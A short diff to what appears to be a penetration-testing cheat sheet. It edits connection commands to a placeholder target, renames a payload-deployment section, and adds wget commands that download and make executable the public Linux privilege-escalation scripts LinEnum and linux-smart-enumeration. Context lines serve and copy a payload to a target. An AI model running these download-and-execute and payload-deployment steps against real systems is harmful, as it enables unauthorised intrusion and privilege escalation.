@@ -146,9 +146,7 @@ $ sudo mount -t cifs -o username=user_name //Target_IP/share_name /mnt/dir-targe
 
 $ smbclient //Target_IP/shared/dir
 
-$ nc Target_IP 44444
-
-$ telnet Target_IP 44444
+$ telnet Target_IP 1234
 
 # 7° Reverse Shell
 
@@ -234,10 +232,14 @@ https://gtfobins.github.io
 
 https://www.exploit-db.com
 
-# 9° Deploy Payload
+# 9° Deploy Payload/Script Enum
 
 $ python2 -m SimpleHTTPServer 8000
 
 $ python3 -m http-server 8000
 
 $ scp payload.sh user@Target_IP:/home/user
+
+$ wget "https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh" -O lse.sh;chmod 700 lse.sh
+
+$ wget "https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" -O LinEnum.sh;chmod 700 LinEnum.sh
